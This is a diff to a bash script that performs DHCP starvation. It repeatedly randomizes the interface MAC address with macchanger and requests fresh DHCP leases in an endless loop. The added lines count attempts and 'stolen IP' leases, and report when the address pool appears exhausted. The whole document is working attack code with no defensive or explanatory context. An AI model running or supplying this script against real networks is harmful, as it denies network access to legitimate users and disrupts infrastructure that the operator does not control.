@@ -14,6 +14,9 @@ echo 'initial-interval 1;' > "${CONFIGFile}"
 
 rm -f "${PIDFile}"
 
+NumberAddress=1
+NumberStolenIP=0
+
 while true; do
       # We kill every dhclient process
       if [ -e "${PIDFile}" ]
@@ -33,6 +36,7 @@ while true; do
       ip add flush "${interface}"
       #ifconfig "${interface}" 0.0.0.0
 
+      echo -n "$((NumberAddress++))] "
       # We switch our MAC address for out interface
       macchanger -a "${interface}" | grep '^New MAC:'
 
@@ -41,7 +45,12 @@ while true; do
       #ifconfig "${interface}" up
 
       # We get a new DHCP Lease
-      dhclient -v "${interface}" -pf "${PIDFile}" -lf "${LEASEFile}" -cf "${CONFIGFile}" 2>&1 | grep DHCPACK
+      if ! dhclient -v "${interface}" -pf "${PIDFile}" -lf "${LEASEFile}" -cf "${CONFIGFile}" 2>&1 | grep DHCPACK
+      then
+         echo "dhcp pool perhaps empty (${NumberStolenIP} stolen IP) !!!!"
+      else
+         ((NumberStolenIP++))
+      fi
 
       sleep 1s
 done
